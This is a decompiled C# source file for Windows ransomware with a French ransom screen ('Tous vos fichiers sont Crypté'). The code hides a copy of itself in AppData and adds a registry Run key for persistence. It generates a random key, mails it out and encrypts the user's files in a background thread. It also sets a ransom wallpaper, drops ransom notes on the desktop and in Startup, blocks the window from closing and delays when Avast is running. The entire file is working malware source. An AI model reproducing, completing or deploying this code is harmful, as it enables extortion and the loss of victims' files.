using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace FL;

[DesignerGenerated]
public class Form1 : Form
{
	public SearchEncodedFiles Decode;

	public SearchFile Encode;

	public string useri;

	public string mainpassword;

	public string ApplicationFolder;

	public string FichierStartup;

	public string FichierDesktop;

	private IContainer icontainer_0;

	[AccessedThroughProperty("Description")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Timer timer_0;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox1")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private PictureBox EbWlJhyQqu;

	[AccessedThroughProperty("TextOpen")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Timer timer_1;

	[field: AccessedThroughProperty("TextBox1")]
	internal virtual TextBox TextBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("c")]
	internal virtual Label c
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Button3")]
	internal virtual Button Button3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual AVTheme AvTheme1
	{
		[CompilerGenerated]
		get
		{
			return _AvTheme1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_7;
			AVTheme avTheme = _AvTheme1;
			if (avTheme != null)
			{
				((Control)avTheme).remove_Click(eventHandler);
			}
			_AvTheme1 = value;
			avTheme = _AvTheme1;
			if (avTheme != null)
			{
				((Control)avTheme).add_Click(eventHandler);
			}
		}
	}

	internal virtual AVWindowButton AvWindowButton1
	{
		[CompilerGenerated]
		get
		{
			return _AvWindowButton1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_0;
			AVWindowButton avWindowButton = _AvWindowButton1;
			if (avWindowButton != null)
			{
				((Control)avWindowButton).remove_Click(eventHandler);
			}
			_AvWindowButton1 = value;
			avWindowButton = _AvWindowButton1;
			if (avWindowButton != null)
			{
				((Control)avWindowButton).add_Click(eventHandler);
			}
		}
	}

	internal virtual AVButton AvButton1
	{
		[CompilerGenerated]
		get
		{
			return _AvButton1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_2;
			AVButton avButton = _AvButton1;
			if (avButton != null)
			{
				((Control)avButton).remove_Click(eventHandler);
			}
			_AvButton1 = value;
			avButton = _AvButton1;
			if (avButton != null)
			{
				((Control)avButton).add_Click(eventHandler);
			}
		}
	}

	internal virtual AVTextbox AvTextbox1
	{
		[CompilerGenerated]
		get
		{
			return _AvTextbox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0014: Unknown result type (might be due to invalid IL or missing references)
			//IL_001a: Expected O, but got Unknown
			EventHandler eventHandler = method_4;
			MouseEventHandler val = new MouseEventHandler(method_6);
			AVTextbox avTextbox = _AvTextbox1;
			if (avTextbox != null)
			{
				((Control)avTextbox).remove_Click(eventHandler);
				((Control)avTextbox).remove_MouseClick(val);
			}
			_AvTextbox1 = value;
			avTextbox = _AvTextbox1;
			if (avTextbox != null)
			{
				((Control)avTextbox).add_Click(eventHandler);
				((Control)avTextbox).add_MouseClick(val);
			}
		}
	}

	internal virtual LinkLabel LinkLabel1
	{
		[CompilerGenerated]
		get
		{
			return _LinkLabel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			LinkLabelLinkClickedEventHandler val = new LinkLabelLinkClickedEventHandler(method_3);
			LinkLabel linkLabel = _LinkLabel1;
			if (linkLabel != null)
			{
				linkLabel.remove_LinkClicked(val);
			}
			_LinkLabel1 = value;
			linkLabel = _LinkLabel1;
			if (linkLabel != null)
			{
				linkLabel.add_LinkClicked(val);
			}
		}
	}

	internal virtual PictureBox PictureBox1
	{
		[CompilerGenerated]
		get
		{
			return EbWlJhyQqu;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EbWlJhyQqu = value;
		}
	}

	[field: AccessedThroughProperty("AvLabel1")]
	internal virtual AVLabel AvLabel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("AvLabel2")]
	internal virtual AVLabel AvLabel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public Form1()
	{
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		Class8.t3hvLuccnmfIO();
		Class8.t3hvLuccnmfIO();
		((Form)this)._002Ector();
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)UxqaodNrC);
		ApplicationFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\nlo.exe";
		FichierStartup = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\Readme.txt";
		FichierDesktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Comment débloquer mes fichiers .txt";
		InitializeComponent();
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SystemParametersInfoA(int int_0, int int_1, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, int int_2);

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void Installation()
	{
		if (File.Exists(Conversions.ToString((object)ApplicationFolder)))
		{
			File.Delete(Conversions.ToString((object)ApplicationFolder));
		}
		File.Copy(Application.get_ExecutablePath(), Conversions.ToString((object)ApplicationFolder));
		File.SetAttributes(Conversions.ToString((object)ApplicationFolder), FileAttributes.Hidden);
		generale.KU_KeyCreate("Software\\Microsoft\\Windows\\CurrentVersion\\Run", "JOJA", Conversions.ToString((object)ApplicationFolder));
		Type typeFromHandle = typeof(Process);
		object[] array = new object[1];
		ref string applicationFolder = ref ApplicationFolder;
		array[0] = applicationFolder;
		object[] array2 = array;
		bool[] array3;
		NewLateBinding.LateCall((object)null, typeFromHandle, "Start", array, (string[])null, (Type[])null, array3 = new bool[1] { true }, true);
		if (array3[0])
		{
			applicationFolder = (string)RuntimeHelpers.GetObjectValue(array2[0]);
		}
		ProjectData.EndApp();
	}

	public void Startapplication()
	{
		//IL_0159: Unknown result type (might be due to invalid IL or missing references)
		//IL_015f: Expected O, but got Unknown
		//IL_01a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c4: Expected O, but got Unknown
		//IL_01c4: Expected O, but got Unknown
		if (!KeyRegistration.smethod_0())
		{
			((Form)this).set_ShowInTaskbar(false);
			((Control)this).set_Visible(false);
			mainpassword = generale.CreateRandomPassword(67);
			if (Operators.ConditionalCompareObjectEqual(Mail.send(mainpassword), (object)true, false))
			{
				generale.KU_KeyCreate("Software\\", "MOI", mainpassword);
				EncodeFiles.Password = mainpassword;
				Encode = new SearchFile();
				Thread thread = new Thread(Encode.method_0, 1);
				thread.Start();
				generale.KU_KeyCreate("Software\\", "1", "1");
				return;
			}
		}
		if (KeyRegistration.ExistsKey())
		{
			((Form)this).set_ShowInTaskbar(false);
			((Control)this).set_Visible(false);
			mainpassword = KeyRegistration.RegRead();
			EncodeFiles.Password = mainpassword;
			Encode = new SearchFile();
			Thread thread2 = new Thread(Encode.method_0, 1);
			thread2.Start();
			return;
		}
		((Control)this).set_Visible(true);
		((Form)this).set_ShowInTaskbar(true);
		vmethod_0().set_Enabled(true);
		vmethod_2().set_Enabled(true);
		try
		{
			File.WriteAllBytes(Path.GetTempPath() + "\\1.png", Class1.smethod_0());
			Thread.Sleep(500);
			Bitmap val = (Bitmap)Image.FromFile(Path.GetTempPath() + "\\1.png");
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			val2.DrawString(Class1.smethod_3().Replace("%date%", Conversions.ToString(DateAndTime.get_Now().Date)).Replace("%id%", generale.smethod_0()), new Font("Calibri", 10f, (FontStyle)1), (Brush)new SolidBrush(Color.Black), (PointF)new Point(0, 100));
			((Image)val).Save(Path.GetTempPath() + "\\2.png", ImageFormat.get_Bmp());
			Thread.Sleep(500);
			string string_ = Path.GetTempPath() + "\\2.png";
			SystemParametersInfoA(20, 0, ref string_, 1);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public bool PasswordTest(string string_0)
	{
		try
		{
			TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
			MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
			tripleDESCryptoServiceProvider.Key = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(string_0));
			tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
			byte[] array = Convert.FromBase64String(generale.GetStrings(File.ReadAllText(GetUserini() + ".css")));
			Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array, 0, array.Length));
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	public string GetUserini()
	{
		if (((ServerComputer)Class3.Class2_0).get_Info().get_OSFullName().Contains("XP"))
		{
			return Conversions.ToString(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)[0]) + ":\\Documents and Settings\\" + Environment.UserName + "\\ntuser.ini";
		}
		return Conversions.ToString(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)[0]) + ":\\users\\" + Environment.UserName + "\\ntuser.ini";
	}

	private void UxqaodNrC(object sender, EventArgs e)
	{
		if (Process.GetProcessesByName("AvastSvc").Length >= 1)
		{
			Thread.Sleep(3000);
		}
		AvLabel2.String1 = "Votre Identifiant: " + generale.smethod_0();
		if (Operators.ConditionalCompareObjectEqual((object)Application.get_ExecutablePath(), (object)ApplicationFolder, false))
		{
			Startapplication();
		}
		else
		{
			Installation();
		}
	}

	private void CnxmYcKny(object sender, EventArgs e)
	{
	}

	public string EncryptionNotComplet()
	{
		return "";
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void method_0(object sender, EventArgs e)
	{
		ProjectData.EndApp();
	}

	private void method_1(object sender, EventArgs e)
	{
		if (!File.Exists(FichierDesktop))
		{
			StreamWriter streamWriter = new StreamWriter(FichierDesktop);
			streamWriter.Write(Class1.smethod_4().Replace("%id%", generale.smethod_0()));
			streamWriter.Close();
		}
		if (!File.Exists(FichierStartup))
		{
			StreamWriter streamWriter2 = new StreamWriter(FichierStartup);
			streamWriter2.Write(Class1.smethod_4().Replace("%id%", generale.smethod_0()));
			streamWriter2.Close();
		}
	}

	private void method_2(object sender, EventArgs e)
	{
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		if (PasswordTest(((Control)AvTextbox1).get_Text()))
		{
			((Control)AvButton1).set_Enabled(false);
			((Control)AvTextbox1).set_Enabled(false);
			((Control)PictureBox1).set_Visible(true);
			AvLabel1.String2 = "/ Décryptage de vos fichier en cours, Veuillez ne pas interrompre le Processus";
			DecodeFiles.Password = ((Control)AvTextbox1).get_Text();
			Decode = new SearchEncodedFiles();
			Thread thread = new Thread(Decode.method_0, 1);
			thread.Start();
		}
		else
		{
			Interaction.MsgBox((object)"Mot de passe invalide", (MsgBoxStyle)64, (object)null);
		}
	}

	private void method_3(object sender, LinkLabelLinkClickedEventArgs e)
	{
		if (File.Exists(FichierDesktop))
		{
			Process.Start(FichierDesktop);
		}
	}

	private void method_4(object sender, EventArgs e)
	{
		((Control)AvTextbox1).set_Text("");
	}

	private void method_5(object sender, EventArgs e)
	{
		try
		{
			if (Process.GetProcessesByName("notepad").Length < 0)
			{
				Process.Start(FichierStartup);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_6(object sender, MouseEventArgs e)
	{
		((Control)AvTextbox1).set_Text("");
	}

	private void method_7(object sender, EventArgs e)
	{
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_004f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Expected O, but got Unknown
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected O, but got Unknown
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Expected O, but got Unknown
		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a1: Expected O, but got Unknown
		//IL_06e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_06f0: Expected O, but got Unknown
		//IL_0826: Unknown result type (might be due to invalid IL or missing references)
		//IL_0830: Expected O, but got Unknown
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		TextBox1 = new TextBox();
		Label1 = new Label();
		c = new Label();
		Button3 = new Button();
		vmethod_1(new Timer(icontainer_0));
		vmethod_3(new Timer(icontainer_0));
		AvTheme1 = new AVTheme();
		AvLabel2 = new AVLabel();
		AvLabel1 = new AVLabel();
		PictureBox1 = new PictureBox();
		LinkLabel1 = new LinkLabel();
		AvWindowButton1 = new AVWindowButton();
		AvButton1 = new AVButton();
		AvTextbox1 = new AVTextbox();
		((Control)AvTheme1).SuspendLayout();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)TextBox1).set_Location(new Point(183, 308));
		TextBox1.set_Multiline(true);
		((Control)TextBox1).set_Name("TextBox1");
		((Control)TextBox1).set_Size(new Size(241, 23));
		((Control)TextBox1).set_TabIndex(3);
		Label1.set_AutoSize(true);
		((Control)Label1).set_Location(new Point(103, 311));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(74, 13));
		((Control)Label1).set_TabIndex(4);
		Label1.set_Text("Mot de passe:");
		c.set_AutoSize(true);
		((Control)c).set_Location(new Point(883, 349));
		((Control)c).set_Name("c");
		((Control)c).set_Size(new Size(12, 13));
		((Control)c).set_TabIndex(5);
		c.set_Text("\"");
		((Control)c).set_Visible(false);
		((Control)Button3).set_Location(new Point(450, 301));
		((Control)Button3).set_Name("Button3");
		((Control)Button3).set_Size(new Size(151, 32));
		((Control)Button3).set_TabIndex(6);
		((ButtonBase)Button3).set_Text("Decrypter mes fichiers");
		((ButtonBase)Button3).set_UseVisualStyleBackColor(true);
		vmethod_0().set_Interval(3000);
		vmethod_2().set_Interval(600000);
		((Control)AvTheme1).set_BackColor(Color.FromArgb(242, 242, 242));
		((Control)AvTheme1).get_Controls().Add((Control)(object)AvLabel2);
		((Control)AvTheme1).get_Controls().Add((Control)(object)AvLabel1);
		((Control)AvTheme1).get_Controls().Add((Control)(object)PictureBox1);
		((Control)AvTheme1).get_Controls().Add((Control)(object)LinkLabel1);
		((Control)AvTheme1).get_Controls().Add((Control)(object)AvWindowButton1);
		((Control)AvTheme1).get_Controls().Add((Control)(object)AvButton1);
		((Control)AvTheme1).get_Controls().Add((Control)(object)AvTextbox1);
		((Control)AvTheme1).set_Dock((DockStyle)5);
		((Control)AvTheme1).set_Location(new Point(0, 0));
		((Control)AvTheme1).set_Name("AvTheme1");
		AvTheme1.PageImage = null;
		AvTheme1.PageName = "BX1";
		((Control)AvTheme1).set_Size(new Size(896, 264));
		((Control)AvTheme1).set_TabIndex(7);
		((Control)AvTheme1).set_Text("AvTheme1");
		AvLabel2.Image = null;
		((Control)AvLabel2).set_Location(new Point(-28, 183));
		((Control)AvLabel2).set_Name("AvLabel2");
		((Control)AvLabel2).set_Size(new Size(259, 25));
		AvLabel2.String1 = "Votre ID:";
		AvLabel2.String2 = "";
		((Control)AvLabel2).set_TabIndex(6);
		((Control)AvLabel2).set_Text("ID:");
		AvLabel1.Image = null;
		((Control)AvLabel1).set_Location(new Point(2, 227));
		((Control)AvLabel1).set_Name("AvLabel1");
		((Control)AvLabel1).set_Size(new Size(838, 25));
		AvLabel1.String1 = "Statut:";
		AvLabel1.String2 = "/ Tous les fichiers en été Crypté";
		((Control)AvLabel1).set_TabIndex(5);
		((Control)AvLabel1).set_Text("AvLabel1");
		PictureBox1.set_Image((Image)(object)Class1.smethod_1());
		((Control)PictureBox1).set_Location(new Point(848, 217));
		((Control)PictureBox1).set_Name("PictureBox1");
		((Control)PictureBox1).set_Size(new Size(47, 47));
		PictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		PictureBox1.set_TabIndex(4);
		PictureBox1.set_TabStop(false);
		((Control)PictureBox1).set_Visible(false);
		((Label)LinkLabel1).set_AutoSize(true);
		((Control)LinkLabel1).set_Location(new Point(3, 167));
		((Control)LinkLabel1).set_Name("LinkLabel1");
		((Control)LinkLabel1).set_Size(new Size(228, 13));
		((Control)LinkLabel1).set_TabIndex(3);
		((Label)LinkLabel1).set_TabStop(true);
		LinkLabel1.set_Text("Vous n'avez pas de mot de passe ?, cliquer ICI");
		((Control)AvWindowButton1).set_BackColor(Color.Transparent);
		((Control)AvWindowButton1).set_Location(new Point(874, 0));
		((Control)AvWindowButton1).set_Name("AvWindowButton1");
		AvWindowButton1.SetImage = "Close";
		((Control)AvWindowButton1).set_Size(new Size(22, 22));
		((Control)AvWindowButton1).set_TabIndex(2);
		((Control)AvWindowButton1).set_Text("AvWindowButton1");
		((Control)AvWindowButton1).set_Visible(false);
		((Control)AvButton1).set_BackColor(Color.Transparent);
		((Control)AvButton1).set_Location(new Point(691, 131));
		AvButton1.MainColor = null;
		((Control)AvButton1).set_Name("AvButton1");
		((Control)AvButton1).set_Size(new Size(202, 33));
		((Control)AvButton1).set_TabIndex(1);
		((Control)AvButton1).set_Text("Débloquer mes fichiers ");
		((Control)AvTextbox1).set_BackColor(Color.White);
		((Control)AvTextbox1).set_Font(new Font("Verdana", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)AvTextbox1).set_ForeColor(Color.Gray);
		((Control)AvTextbox1).set_Location(new Point(6, 131));
		AvTextbox1.MaxLength = 32767;
		AvTextbox1.MultiLine = false;
		((Control)AvTextbox1).set_Name("AvTextbox1");
		((Control)AvTextbox1).set_Size(new Size(679, 33));
		((Control)AvTextbox1).set_TabIndex(0);
		((Control)AvTextbox1).set_Text("Mot de passe");
		AvTextbox1.TextAlignment = (HorizontalAlignment)0;
		AvTextbox1.UseSystemPasswordChar = false;
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(896, 264));
		((Control)this).get_Controls().Add((Control)(object)AvTheme1);
		((Control)this).get_Controls().Add((Control)(object)Button3);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).get_Controls().Add((Control)(object)c);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Tous vos fichiers sont Crypté");
		((Control)AvTheme1).ResumeLayout(false);
		((Control)AvTheme1).PerformLayout();
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Timer vmethod_0()
	{
		return timer_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_1(Timer value)
	{
		EventHandler eventHandler = method_1;
		Timer val = timer_0;
		if (val != null)
		{
			val.remove_Tick(eventHandler);
		}
		timer_0 = value;
		val = timer_0;
		if (val != null)
		{
			val.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Timer vmethod_2()
	{
		return timer_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_3(Timer value)
	{
		EventHandler eventHandler = method_5;
		Timer val = timer_1;
		if (val != null)
		{
			val.remove_Tick(eventHandler);
		}
		timer_1 = value;
		val = timer_1;
		if (val != null)
		{
			val.add_Tick(eventHandler);
		}
	}
}
